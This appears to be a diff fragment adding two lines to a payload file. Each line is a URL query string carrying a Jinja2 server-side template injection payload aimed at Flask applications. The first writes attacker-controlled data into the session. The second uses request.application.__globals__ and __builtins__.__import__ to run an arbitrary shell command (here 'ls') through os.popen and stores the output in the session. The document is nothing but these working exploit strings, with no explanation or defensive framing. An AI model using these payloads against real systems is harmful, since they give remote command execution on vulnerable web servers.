@@ -1,0 +1,2 @@
+?a=somevalue&name={%%20if%20session.update({request.args.a:%20True})%20%}{%endif%}
+?a=os&b=ls&name={% if session.update({request.application.__globals__.__builtins__.__import__(request.args.a).popen(request.args.b).read(): True}) %}{%endif%}
